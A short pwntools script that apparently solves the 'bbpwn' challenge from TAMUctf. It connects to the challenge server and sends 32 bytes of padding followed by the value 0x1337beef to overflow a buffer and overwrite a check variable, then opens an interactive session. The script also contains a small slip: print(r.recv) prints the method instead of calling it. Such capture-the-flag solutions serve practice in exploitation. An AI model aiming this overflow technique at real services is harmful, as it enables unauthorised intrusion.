#!/usr/bin/env python

from pwn import *

context.terminal = ['kitty', '-e', 'sh', '-c']

r = remote('challenges.tamuctf.com', 4252)
# r = process('./bbpwn'); gdb.attach(r); pause()

r.sendlineafter('Enter a string: ', b'A'*32 + p32(0x1337beef))
print(r.recv)

r.interactive()
